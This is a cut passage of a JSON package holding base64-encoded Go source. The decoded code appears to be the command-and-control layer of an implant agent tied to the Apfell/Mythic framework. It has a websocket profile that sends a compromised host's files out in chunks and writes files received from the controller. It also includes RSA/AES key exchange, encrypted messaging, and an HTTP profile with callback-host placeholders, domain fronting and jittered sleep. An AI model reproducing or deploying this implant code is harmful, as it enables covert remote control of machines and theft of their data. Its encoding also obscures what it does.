maWxlLkNsb3NlKCkKCgljLlNlbmRGaWxlQ2h1bmtzKHRhc2ssIHJhdywgY2gpCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgR2V0RmlsZSh0YXNrIHN0cnVjdHMuVGFzaywgZmlsZURldGFpbHMgc3RydWN0cy5GaWxlVXBsb2FkUGFyYW1zLCBjaCBjaGFuIFtdYnl0ZSkgewoKCglmaWxlVXBsb2FkTXNnIDo9IHN0cnVjdHMuRmlsZVVwbG9hZENodW5rTWVzc2FnZXt9IC8vQ3JlYXRlIHRoZSBmaWxlIHVwbG9hZCBjaHVuayBtZXNzYWdlCglmaWxlVXBsb2FkTXNnLkFjdGlvbiA9ICJ1cGxvYWQiCglmaWxlVXBsb2FkTXNnLkZpbGVJRCA9IGZpbGVEZXRhaWxzLkZpbGVJRAoJZmlsZVVwbG9hZE1zZy5DaHVua1NpemUgPSAxMDI0MDAwCglmaWxlVXBsb2FkTXNnLkNodW5rTnVtID0gMQoJZmlsZVVwbG9hZE1zZy5GdWxsUGF0aCA9IGZpbGVEZXRhaWxzLlJlbW90ZVBhdGgKCWZpbGVVcGxvYWRNc2cuVGFza0lEID0gdGFzay5UYXNrSUQKCgltc2csIF8gOj0ganNvbi5NYXJzaGFsKGZpbGVVcGxvYWRNc2cpCgltdS5Mb2NrKCkKCVVwbG9hZFJlc3BvbnNlcyA9IGFwcGVuZChVcGxvYWRSZXNwb25zZXMsIG1zZykKCW11LlVubG9jaygpCgkvLyBXYWl0IGZvciByZXNwb25zZSBmcm9tIGFwZmVsbAoJcmF3RGF0YSA6PSA8LWNoCgoJZmlsZVVwbG9hZE1zZ1Jlc3BvbnNlIDo9IHN0cnVjdHMuRmlsZVVwbG9hZENodW5rTWVzc2FnZVJlc3BvbnNle30gLy8gVW5tYXJzaGFsIHRoZSBmaWxlIHVwbG9hZCByZXNwb25zZSBmcm9tIGFwZmVsbAoJZXJyIDo9IGpzb24uVW5tYXJzaGFsKHJhd0RhdGEsICZmaWxlVXBsb2FkTXNnUmVzcG9uc2UpCglpZiBlcnIgIT0gbmlsIHsKCQllcnJSZXNwb25zZSA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQllcnJSZXNwb25zZS5Db21wbGV0ZWQgPSB0cnVlCgkJZXJyUmVzcG9uc2UuVGFza0lEID0gdGFzay5UYXNrSUQKCQllcnJSZXNwb25zZS5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIkVycm9yIHVubWFyc2hhbGluZyB0YXNrIHJlc3BvbnNlOiAlcyIsIGVyci5FcnJvcigpKQoJCWVyclJlc3BvbnNlRW5jLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwb25zZSkKCQltdS5Mb2NrKCkKCQlUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGVyclJlc3BvbnNlRW5jKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CgoJZiwgZXJyIDo9IG9zLkNyZWF0ZShmaWxlRGV0YWlscy5SZW1vdGVQYXRoKQoJaWYgZXJyICE9IG5pbCB7CgkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJZXJyUmVzcG9uc2UuQ29tcGxldGVkID0gdHJ1ZQoJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciBjcmVhdGluZyBmaWxlOiAlcyIsIGVyci5FcnJvcigpKQoJCWVyclJlc3BvbnNlRW5jLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwb25zZSkKCQltdS5Mb2NrKCkKCQlUYXNrUmVzcG9uc2VzID0gYXBwZW5kKFRhc2tSZXNwb25zZXMsIGVyclJlc3BvbnNlRW5jKQoJCW11LlVubG9jaygpCgkJcmV0dXJuCgl9CglkZWZlciBmLkNsb3NlKCkKCWRlY29kZWQsIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhmaWxlVXBsb2FkTXNnUmVzcG9uc2UuQ2h1bmtEYXRhKQoKCV8sIGVyciA9IGYuV3JpdGUoZGVjb2RlZCkKCglpZiBlcnIgIT0gbmlsIHsKCQllcnJSZXNwb25zZSA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQllcnJSZXNwb25zZS5Db21wbGV0ZWQgPSB0cnVlCgkJZXJyUmVzcG9uc2UuVGFza0lEID0gdGFzay5UYXNrSUQKCQllcnJSZXNwb25zZS5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIkVycm9yIHdyaXRpbmcgdG8gZmlsZTogJXMiLCBlcnIuRXJyb3IoKSkKCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJbXUuTG9jaygpCgkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlcnJSZXNwb25zZUVuYykKCQltdS5VbmxvY2soKQoJCXJldHVybgoJfQoKCW9mZnNldCA6PSBpbnQ2NChsZW4oZGVjb2RlZCkpCglpZiBmaWxlVXBsb2FkTXNnUmVzcG9uc2UuVG90YWxDaHVua3MgPiAxIHsKCQlmb3IgaW5kZXggOj0gMjsgaW5kZXggPD0gZmlsZVVwbG9hZE1zZ1Jlc3BvbnNlLlRvdGFsQ2h1bmtzOyBpbmRleCsrIHsKCQkJZmlsZVVwbG9hZE1zZyA9IHN0cnVjdHMuRmlsZVVwbG9hZENodW5rTWVzc2FnZXt9CgkJCWZpbGVVcGxvYWRNc2cuQWN0aW9uID0gInVwbG9hZCIKCQkJZmlsZVVwbG9hZE1zZy5DaHVua051bSA9IGluZGV4CgkJCWZpbGVVcGxvYWRNc2cuQ2h1bmtTaXplID0gMTAyNDAwMAoJCQlmaWxlVXBsb2FkTXNnLkZpbGVJRCA9IGZpbGVEZXRhaWxzLkZpbGVJRAoJCQlmaWxlVXBsb2FkTXNnLkZ1bGxQYXRoID0gZmlsZURldGFpbHMuUmVtb3RlUGF0aAoJCQlmaWxlVXBsb2FkTXNnLlRhc2tJRCA9IHRhc2suVGFza0lECgoJCQltc2csIF8gOj0ganNvbi5NYXJzaGFsKGZpbGVVcGxvYWRNc2cpCgkJCW11LkxvY2soKQoJCQlVcGxvYWRSZXNwb25zZXMgPSBhcHBlbmQoVXBsb2FkUmVzcG9uc2VzLCBtc2cpCgkJCW11LlVubG9jaygpCgkJCXJhd0RhdGEgOj0gPC1jaAoKCQkJZmlsZVVwbG9hZE1zZ1Jlc3BvbnNlID0gc3RydWN0cy5GaWxlVXBsb2FkQ2h1bmtNZXNzYWdlUmVzcG9uc2V7fSAvLyBVbm1hcnNoYWwgdGhlIGZpbGUgdXBsb2FkIHJlc3BvbnNlIGZyb20gYXBmZWxsCgkJCWVyciA6PSBqc29uLlVubWFyc2hhbChyYXdEYXRhLCAmZmlsZVVwbG9hZE1zZ1Jlc3BvbnNlKQoJCQlpZiBlcnIgIT0gbmlsIHsKCQkJCWVyclJlc3BvbnNlIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCQkJZXJyUmVzcG9uc2UuQ29tcGxldGVkID0gdHJ1ZQoJCQkJZXJyUmVzcG9uc2UuVGFza0lEID0gdGFzay5UYXNrSUQKCQkJCWVyclJlc3BvbnNlLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiRXJyb3IgbWFyc2hhbGluZyByZXNwb25zZTogJXMiLCBlcnIuRXJyb3IoKSkKCQkJCWVyclJlc3BvbnNlRW5jLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwb25zZSkKCQkJCW11LkxvY2soKQoJCQkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlcnJSZXNwb25zZUVuYykKCQkJCW11LlVubG9jaygpCgkJCQlyZXR1cm4KCQkJfQoKCQkJZGVjb2RlZCwgXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlU3RyaW5nKGZpbGVVcGxvYWRNc2dSZXNwb25zZS5DaHVua0RhdGEpCgoJCQlfLCBlcnIgPSBmLldyaXRlQXQoZGVjb2RlZCwgb2Zmc2V0KQoKCQkJaWYgZXJyICE9IG5pbCB7CgkJCQllcnJSZXNwb25zZSA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCQkJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQkJCWVyclJlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgkJCQllcnJSZXNwb25zZS5Vc2VyT3V0cHV0ID0gZm10LlNwcmludGYoIkVycm9yIHdyaXRpbmcgdG8gZmlsZTogJXMiLCBlcnIuRXJyb3IoKSkKCQkJCWVyclJlc3BvbnNlRW5jLCBfIDo9IGpzb24uTWFyc2hhbChlcnJSZXNwb25zZSkKCQkJCW11LkxvY2soKQoJCQkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlcnJSZXNwb25zZUVuYykKCQkJCW11LlVubG9jaygpCgkJCQlyZXR1cm4KCQkJfQoKCQkJb2Zmc2V0ID0gb2Zmc2V0ICsgaW50NjQobGVuKGRlY29kZWQpKQoJCX0KCX0KCglyZXNwIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJcmVzcC5Vc2VyT3V0cHV0ID0gIkZpbGUgdXBsb2FkIGNvbXBsZXRlIgoJcmVzcC5Db21wbGV0ZWQgPSB0cnVlCglyZXNwLlRhc2tJRCA9IHRhc2suVGFza0lECgllbmNSZXNwLCBlcnIgOj0ganNvbi5NYXJzaGFsKHJlc3ApCgltdS5Mb2NrKCkKCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZW5jUmVzcCkKCW11LlVubG9jaygpCglyZXR1cm4KfQoKZnVuYyAoYyAqQzJXZWJzb2NrZXRzKSBTZW5kRmlsZUNodW5rcyh0YXNrIHN0cnVjdHMuVGFzaywgZmlsZURhdGEgW11ieXRlLCBjaCBjaGFuIFtdYnl0ZSkgewoJc2l6ZSA6PSBsZW4oZmlsZURhdGEpCgoJY29uc3QgZmlsZUNodW5rID0gNTEyMDAwIC8vTm9ybWFsIGFwZmVsbCBjaHVuayBzaXplCgljaHVua3MgOj0gdWludDY0KG1hdGguQ2VpbChmbG9hdDY0KHNpemUpIC8gZmlsZUNodW5rKSkKCWNodW5rUmVzcG9uc2UgOj0gc3RydWN0cy5GaWxlRG93bmxvYWRJbml0aWFsTWVzc2FnZXt9CgljaHVua1Jlc3BvbnNlLk51bUNodW5rcyA9IGludChjaHVua3MpCgljaHVua1Jlc3BvbnNlLlRhc2tJRCA9IHRhc2suVGFza0lECgljaHVua1Jlc3BvbnNlLkZ1bGxQYXRoID0gdGFzay5QYXJhbXMKCW1zZywgXyA6PSBqc29uLk1hcnNoYWwoY2h1bmtSZXNwb25zZSkKCW11LkxvY2soKQoJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBtc2cpCgltdS5VbmxvY2soKQoJLy8gV2FpdCBmb3IgYSByZXNwb25zZSBmcm9tIHRoZSBjaGFubmVsCgl2YXIgZmlsZURldGFpbHMgbWFwW3N0cmluZ11pbnRlcmZhY2V7fQoJLy8gV2FpdCBmb3IgYSByZXNwb25zZSBmcm9tIHRoZSBjaGFubmVsCgoJZm9yIHsKCQlyZXNwIDo9IDwtIGNoCgkJZXJyIDo9IGpzb24uVW5tYXJzaGFsKHJlc3AsICZmaWxlRGV0YWlscykKCQlpZiBlcnIgIT0gbmlsIHsKCQkJZXJyUmVzcG9uc2UgOj0gc3RydWN0cy5SZXNwb25zZXt9CgkJCWVyclJlc3BvbnNlLkNvbXBsZXRlZCA9IHRydWUKCQkJZXJyUmVzcG9uc2UuVGFza0lEID0gdGFzay5UYXNrSUQKCQkJZXJyUmVzcG9uc2UuVXNlck91dHB1dCA9IGZtdC5TcHJpbnRmKCJFcnJvciB1bm1hcnNoYWxpbmcgdGFzayByZXNwb25zZTogJXMiLCBlcnIuRXJyb3IoKSkKCQkJZXJyUmVzcG9uc2VFbmMsIF8gOj0ganNvbi5NYXJzaGFsKGVyclJlc3BvbnNlKQoKCQkJbXUuTG9jaygpCgkJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJCW11LlVubG9jaygpCgkJCXJldHVybgoJCX0KCgkJLy9sb2cuUHJpbnRmKCJSZWNlaXZlIGZpbGUgZG93bmxvYWQgcmVnaXN0cmF0aW9uIHJlc3BvbnNlICVzXG4iLCByZXNwKQoJCWlmIF8sIG9rIDo9IGZpbGVEZXRhaWxzWyJmaWxlX2lkIl07IG9rIHsKCQkJaWYgb2sgewoJCQkJLy9sb2cuUHJpbnRsbigiRm91bmQgcmVzcG9uc2Ugd2l0aCBmaWxlX2lkIGtleSAiLCBmaWxlaWQpCgkJCQlicmVhawoJCQl9IGVsc2UgewoJCQkJLy9sb2cuUHJpbnRsbigiRGlkbid0IGZpbmQgcmVzcG9uc2Ugd2l0aCBmaWxlX2lkIGtleSIpCgkJCQljb250aW51ZQoJCQl9CgkJfQoJfQoKCQoJciA6PSBieXRlcy5OZXdCdWZmZXIoZmlsZURhdGEpCgkvLyBTbGVlcCBoZXJlIHNvIHdlIGRvbid0IHNwYW0gYXBmZWxsCgkvL3RpbWUuU2xlZXAodGltZS5EdXJhdGlvbihjLmdldFNsZWVwVGltZSgpKSAqIHRpbWUuU2Vjb25kKTsKCWZvciBpIDo9IHVpbnQ2NCgwKTsgaSA8IGNodW5rczsgaSsrIHsKCQlwYXJ0U2l6ZSA6PSBpbnQobWF0aC5NaW4oZmlsZUNodW5rLCBmbG9hdDY0KGludDY0KHNpemUpLWludDY0KGkqZmlsZUNodW5rKSkpKQoJCXBhcnRCdWZmZXIgOj0gbWFrZShbXWJ5dGUsIHBhcnRTaXplKQoJCS8vIENyZWF0ZSBhIHRlbXBvcmFyeSBidWZmZXIgYW5kIHJlYWQgYSBjaHVuayBpbnRvIHRoYXQgYnVmZmVyIGZyb20gdGhlIGZpbGUKCQlyZWFkLCBlcnIgOj0gci5SZWFkKHBhcnRCdWZmZXIpCgkJaWYgZXJyICE9IG5pbCB8fCByZWFkID09IDAgewoJCQlicmVhawoJCX0KCgkJbXNnIDo9IHN0cnVjdHMuRmlsZURvd25sb2FkQ2h1bmtNZXNzYWdle30KCQltc2cuQ2h1bmtOdW0gPSBpbnQoaSkgKyAxCgkJbXNnLkZpbGVJRCA9IGZpbGVEZXRhaWxzWyJmaWxlX2lkIl0uKHN0cmluZykKCQltc2cuQ2h1bmtEYXRhID0gYmFzZTY0LlN0ZEVuY29kaW5nLkVuY29kZVRvU3RyaW5nKHBhcnRCdWZmZXIpCgkJbXNnLlRhc2tJRCA9IHRhc2suVGFza0lECgoJCWVuY21zZywgXyA6PSBqc29uLk1hcnNoYWwobXNnKQoJCW11LkxvY2soKQoJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZW5jbXNnKQoJCW11LlVubG9jaygpCgoJCS8vIFdhaXQgZm9yIGEgcmVzcG9uc2UgZm9yIG91ciBmaWxlIGNodW5rCgkJdmFyIHBvc3RSZXNwIG1hcFtzdHJpbmddaW50ZXJmYWNle30KCQlmb3IgewoJCQlkZWNSZXNwIDo9IDwtY2gKCQkJZXJyIDo9IGpzb24uVW5tYXJzaGFsKGRlY1Jlc3AsICZwb3N0UmVzcCkvLyBXYWl0IGZvciBhIHJlc3BvbnNlIGZvciBvdXIgZmlsZSBjaHVuawoJCQoJCQlpZiBlcnIgIT0gbmlsIHsKCQkJCWVyclJlc3BvbnNlIDo9IHN0cnVjdHMuUmVzcG9uc2V7fQoJCQkJZXJyUmVzcG9uc2UuQ29tcGxldGVkID0gdHJ1ZQoJCQkJZXJyUmVzcG9uc2UuVGFza0lEID0gdGFzay5UYXNrSUQKCQkJCWVyclJlc3BvbnNlLlVzZXJPdXRwdXQgPSBmbXQuU3ByaW50ZigiRXJyb3IgdW5tYXJzaGFsaW5nIHRhc2sgcmVzcG9uc2U6ICVzIiwgZXJyLkVycm9yKCkpCgkJCQllcnJSZXNwb25zZUVuYywgXyA6PSBqc29uLk1hcnNoYWwoZXJyUmVzcG9uc2UpCgkJCQltdS5Mb2NrKCkKCQkJCVRhc2tSZXNwb25zZXMgPSBhcHBlbmQoVGFza1Jlc3BvbnNlcywgZXJyUmVzcG9uc2VFbmMpCgkJCQltdS5VbmxvY2soKQoJCQkJcmV0dXJuCgkJCX0KCgkJCS8vbG9nLlByaW50ZigiUmVjZWl2ZWQgY2h1bmsgZG93bmxvYWQgcmVzcG9uc2UgJXNcbiIsIGRlY1Jlc3ApCgkJCWlmIF8sIG9rIDo9IHBvc3RSZXNwWyJzdGF0dXMiXTsgb2sgewoJCQkJaWYgb2sgewoJCQkJCS8vbG9nLlByaW50bG4oIkZvdW5kIHJlc3BvbnNlIHdpdGggc3RhdHVzIGtleTogIiwgc3RhdHVzKQoJCQkJCWJyZWFrCgkJCQl9IGVsc2UgewoJCQkJCS8vbG9nLlByaW50bG4oIkRpZG4ndCBmaW5kIHJlc3BvbnNlIHdpdGggc3RhdHVzIGtleSIpCgkJCQkJY29udGludWUKCQkJCX0KCQkJfQoJCX0KCgkJaWYgIXN0cmluZ3MuQ29udGFpbnMocG9zdFJlc3BbInN0YXR1cyJdLihzdHJpbmcpLCAic3VjY2VzcyIpIHsKCQkJLy8gSWYgdGhlIHBvc3Qgd2FzIG5vdCBzdWNjZXNzZnVsLCB3YWl0IGFuZCB0cnkgdG8gc2VuZCBpdCBvbmUgbW9yZSB0aW1lCgkJCQoJCQltdS5Mb2NrKCkKCQkJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBlbmNtc2cpCgkJCW11LlVubG9jaygpCgkJfQoKCQl0aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5nZXRTbGVlcFRpbWUoKSkgKiB0aW1lLlNlY29uZCkKCX0KCS8vIFJlc2V0IHRoZSBidWZmZXIgdG8gYmUgZW1wdHkKCXIuUmVzZXQoKQoJciA9IG5pbAoJZmlsZURhdGEgPSBuaWwKCglmaW5hbCA6PSBzdHJ1Y3RzLlJlc3BvbnNle30KCWZpbmFsLkNvbXBsZXRlZCA9IHRydWUKCWZpbmFsLlRhc2tJRCA9IHRhc2suVGFza0lECglmaW5hbC5Vc2VyT3V0cHV0ID0gImZpbGUgZG93bmxvYWRlZCIKCWZpbmFsRW5jLCBfIDo9IGpzb24uTWFyc2hhbChmaW5hbCkKCS8vYy5Qb3N0UmVzcG9uc2UodGFzaywgc3RyaW5nKGZpbmFsRW5jKSkKCW11LkxvY2soKQoJVGFza1Jlc3BvbnNlcyA9IGFwcGVuZChUYXNrUmVzcG9uc2VzLCBmaW5hbEVuYykKCW11LlVubG9jaygpCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgTmVnb3RpYXRlS2V5KCkgc3RyaW5nIHsKCXNlc3Npb25JRCA6PSBHZW5lcmF0ZVNlc3Npb25JRCgpCglwdWIsIHByaXYgOj0gY3J5cHRvLkdlbmVyYXRlUlNBS2V5UGFpcigpCgljLlJzYVByaXZhdGVLZXkgPSBwcml2CgkvL2luaXRNZXNzYWdlIDo9IHN0cnVjdHMuRUtFSW5pdHt9Cglpbml0TWVzc2FnZSA6PSBzdHJ1Y3RzLkVrZUtleUV4Y2hhbmdlTWVzc2FnZXt9Cglpbml0TWVzc2FnZS5BY3Rpb24gPSAic3RhZ2luZ19yc2EiCglpbml0TWVzc2FnZS5TZXNzaW9uSUQgPSBzZXNzaW9uSUQKCWluaXRNZXNzYWdlLlB1YktleSA9IGJhc2U2NC5TdGRFbmNvZGluZy5FbmNvZGVUb1N0cmluZyhwdWIpCgoJLy8gRW5jb2RlIGFuZCBlbmNyeXB0IHRoZSBqc29uIG1lc3NhZ2UKCXJhdywgZXJyIDo9IGpzb24uTWFyc2hhbChpbml0TWVzc2FnZSkKCglpZiBlcnIgIT0gbmlsIHsKCQkvL2xvZy5QcmludGYoIkVycm9yIG1hcnNoYWxpbmcgZGF0YTogJXMiLCBlcnIuRXJyb3IoKSkKCQlyZXR1cm4gIiIKCX0KCgkvL2xvZy5QcmludGYoIlNlbmRpbmcgRUtFIG1zZzogJSt2XG4iLCBpbml0TWVzc2FnZSkKCXJlc3AgOj0gYy5zZW5kRGF0YSgiIiwgcmF3KQoKCS8vZGVjcnlwdGVkUmVzcG9uc2UgOj0gY3J5cHRvLlJzYURlY3J5cHRDaXBoZXJCeXRlcyhyZXNwLCBjLlJzYVByaXZhdGVLZXkpCglzZXNzaW9uS2V5UmVzcCA6PSBzdHJ1Y3RzLkVrZUtleUV4Y2hhbmdlTWVzc2FnZVJlc3BvbnNle30KCgllcnIgPSBqc29uLlVubWFyc2hhbChyZXNwLCAmc2Vzc2lvbktleVJlc3ApCglpZiBlcnIgIT0gbmlsIHsKCQkvL2xvZy5QcmludGYoIkVycm9yIHVubWFyc2hhbGluZyBSc2FSZXNwb25zZSAlcyIsIGVyci5FcnJvcigpKQoJCXJldHVybiAiIgoJfQoKCS8vbG9nLlByaW50ZigiUmVjZWl2ZWQgRUtFIHJlc3BvbnNlOiAlK3ZcbiIsIHNlc3Npb25LZXlSZXNwKQoJLy8gU2F2ZSB0aGUgbmV3IEFFUyBzZXNzaW9uIGtleQoJZW5jcnlwdGVkU2VzaW9uS2V5LCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoc2Vzc2lvbktleVJlc3AuU2Vzc2lvbktleSkKCWRlY3J5cHRlZEtleSA6PSBjcnlwdG8uUnNhRGVjcnlwdENpcGhlckJ5dGVzKGVuY3J5cHRlZFNlc2lvbktleSwgYy5Sc2FQcml2YXRlS2V5KQoJYy5LZXkgPSBiYXNlNjQuU3RkRW5jb2RpbmcuRW5jb2RlVG9TdHJpbmcoZGVjcnlwdGVkS2V5KSAvLyBTYXZlIHRoZSBuZXcgQUVTIHNlc3Npb24ga2V5CgljLkV4Y2hhbmdpbmdLZXlzID0gZmFsc2UKCglpZiBsZW4oc2Vzc2lvbktleVJlc3AuVVVJRCkgPiAwIHsKCQljLkFwZmVsbElEID0gc2Vzc2lvbktleVJlc3AuVVVJRAoJfQoKCXJldHVybiBzZXNzaW9uSUQKCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgc2VuZERhdGEodGFnIHN0cmluZywgc2VuZERhdGEgW11ieXRlKSBbXWJ5dGUgewoJbSA6PSBzdHJ1Y3RzLk1lc3NhZ2V7fQoKCWZvciB0cnVlewoJCWlmIGxlbihjLktleSkgIT0gMCB7CgkJCXNlbmREYXRhID0gYy5lbmNyeXB0TWVzc2FnZShzZW5kRGF0YSkKCQl9CgkKCQlzZW5kRGF0YSA9IGFwcGVuZChbXWJ5dGUoYy5BcGZlbGxJRCksIHNlbmREYXRhLi4uKQoJCXNlbmREYXRhID0gW11ieXRlKGJhc2U2NC5TdGRFbmNvZGluZy5FbmNvZGVUb1N0cmluZyhzZW5kRGF0YSkpCgkKCQltLkNsaWVudCA9IHRydWUKCQltLkRhdGEgPSBzdHJpbmcoc2VuZERhdGEpCgkJbS5UYWcgPSB0YWcKCQkvL2xvZy5QcmludGYoIlNlbmRpbmcgbWVzc2FnZSAlK3ZcbiIsIG0pCgkJZXJyIDo9IGMuQ29ubi5Xcml0ZUpTT04obSkKCQlpZiBlcnIgIT0gbmlsIHsKCQkJdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuZ2V0U2xlZXBUaW1lKCkpICogdGltZS5TZWNvbmQpOwoJCQljb250aW51ZQoJCX0KCQkvLyBSZWFkIHRoZSByZXNwb25zZQoJCXJlc3AgOj0gc3RydWN0cy5NZXNzYWdle30KCQllcnIgPSBjLkNvbm4uUmVhZEpTT04oJnJlc3ApCgkKCQlpZiBlcnIgIT0gbmlsIHsKCQkJLy9sb2cuUHJpbnRsbigiRXJyb3IgdHJ5aW5nIHRvIHJlYWQgbWVzc2FnZSAiLCBlcnIuRXJyb3IoKSkKCQkJdGltZS5TbGVlcCh0aW1lLkR1cmF0aW9uKGMuZ2V0U2xlZXBUaW1lKCkpICogdGltZS5TZWNvbmQpOwoJCQljb250aW51ZQoJCX0KCQoJCXJhdywgZXJyIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcocmVzcC5EYXRhKQoJCWlmIGVyciAhPSBuaWwgewoJCQkvL2xvZy5QcmludGxuKCJFcnJvciBkZWNvZGluZyBiYXNlNjQgZGF0YTogIiwgZXJyLkVycm9yKCkpCgkJCXJldHVybiBtYWtlKFtdYnl0ZSwgMCkKCQl9CgoJCWlmIGxlbihyYXcpID09IDAgewoJCQl0aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5nZXRTbGVlcFRpbWUoKSkgKiB0aW1lLlNlY29uZCk7CiAgICAgICAgICAgIGNvbnRpbnVlCgkJfQoJCgkJZW5jX3JhdyA6PSByYXdbMzY6XSAvLyBSZW1vdmUgdGhlIFBheWxvYWQgVVVJRAoJCgkJaWYgbGVuKGMuS2V5KSAhPSAwIHsKCQkJLy9sb2cuUHJpbnRmKCJEZWNyeXB0aW5nIGRhdGEiKQoJCQllbmNfcmF3ID0gYy5kZWNyeXB0TWVzc2FnZShlbmNfcmF3KQoJCQlpZiBsZW4oZW5jX3JhdykgPT0gMCB7CgkJCQl0aW1lLlNsZWVwKHRpbWUuRHVyYXRpb24oYy5nZXRTbGVlcFRpbWUoKSkgKiB0aW1lLlNlY29uZCk7CiAgICAgICAgICAgICAgICBjb250aW51ZQoJCQl9CgkJfQoJCgkJcmV0dXJuIGVuY19yYXcKCX0KCQoJcmV0dXJuIG1ha2UoW11ieXRlLCAwKQp9CgoKZnVuYyAoYyAqQzJXZWJzb2NrZXRzKSBlbmNyeXB0TWVzc2FnZShtc2cgW11ieXRlKSBbXWJ5dGUgewoJa2V5LCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGVTdHJpbmcoYy5LZXkpCglyZXR1cm4gY3J5cHRvLkFlc0VuY3J5cHQoa2V5LCBtc2cpCn0KCmZ1bmMgKGMgKkMyV2Vic29ja2V0cykgZGVjcnlwdE1lc3NhZ2UobXNnIFtdYnl0ZSkgW11ieXRlIHsKCWtleSwgXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlU3RyaW5nKGMuS2V5KQoJcmV0dXJuIGNyeXB0by5BZXNEZWNyeXB0KGtleSwgbXNnKQp9"
          }
        ],
        "default": [
          {
            "default.go": "cGFja2FnZSBwcm9maWxlcwoKaW1wb3J0ICgKCSJieXRlcyIKCSJjcnlwdG8vcnNhIgoJImVuY29kaW5nL2Jhc2U2NCIKCSJlbmNvZGluZy9qc29uIgoJImZtdCIKCSJpby9pb3V0aWwiCgkvLyJsb2ciCgkibWF0aCIKCSJuZXQvaHR0cCIKCSJvcyIKCSJzdHJpbmdzIgoJInRpbWUiCgkicmVmbGVjdCIKCSJzeW5jIgoJImNyeXB0by90bHMiCgoJInBrZy91dGlscy9jcnlwdG8iCgkicGtnL3V0aWxzL2Z1bmN0aW9ucyIKCSJwa2cvdXRpbHMvc3RydWN0cyIKKQoKdmFyIENvbmZpZyA9IHN0cnVjdHMuRGVmYXVsdGNvbmZpZ3sKCSJlbmNyeXB0ZWRfZXhjaGFuZ2VfY2hlY2siLAoJIkFFU1BTSyIsCgkiY2FsbGJhY2tfaG9zdDpjYWxsYmFja19wb3J0LyIsCgkiVVNFUl9BR0VOVCIsCgljYWxsYmFja19pbnRlcnZhbCwKCSJkb21haW5fZnJvbnQiLAoJY2FsbGJhY2tfaml0dGVyLAp9Cgp2YXIgbXUgc3luYy5NdXRleAoKCnR5cGUgQzJEZWZhdWx0IHN0cnVjdCB7CglIb3N0SGVhZGVyICAgICBzdHJpbmcKCUJhc2VVUkwgICAgICAgIHN0cmluZwoJSW50ZXJ2YWwgICAgICAgaW50CglKaXR0ZXIgICAgICAgICBpbnQKCUV4Y2hhbmdpbmdLZXlzIGJvb2wKCUFwZmVsbElEICAgICAgIHN0cmluZwoJVXNlckFnZW50ICAgICAgc3RyaW5nCglVVUlEICAgICAgICAgICBzdHJpbmcKCUtleSAgICAgICAgIHN0cmluZwoJUnNhUHJpdmF0ZUtleSAgKnJzYS5Qcml2YXRlS2V5Cn0KCmZ1bmMgbmV3UHJvZmlsZSgpIFByb2ZpbGUgewoJcmV0dXJuICZDMkRlZmF1bHR7fQp9CmZ1bmMgKGMgQzJEZWZhdWx0KSBnZXRTbGVlcFRpbWUoKSBpbnR7CiAgICByZXR1cm4gYy5JbnRlcnZhbCArIGludChtYXRoLlJvdW5kKChmbG9hdDY0KGMuSW50ZXJ2YWwpICogKHNlZWRlZFJhbmQuRmxvYXQ2NCgpICogZmxvYXQ2NChjLkppdHRlcikpL2Zsb2F0NjQoMTAwLjApKSkpOwp9CgpmdW5jIChjIEMyRGVmYXVsdCkgU2xlZXBJbnRlcnZhbCgpIGludCB7CglyZXR1cm4gYy5nZXRTbGVlcFRpbWUoKQp9CgpmdW5jIChjICpDMkRlZmF1bHQpIFNldFNsZWVwSW50ZXJ2YWwoaW50ZXJ2YWwgaW50KSB7CgljLkludGVydmFsID0gaW50ZXJ2YWwKfQoKZnVuYyAoYyAqQzJEZWZhdWx0KSBTZXRTbGVlcEppdHRlcihqaXR0ZXIgaW50KXsKICAgIGMuSml0dGVyID0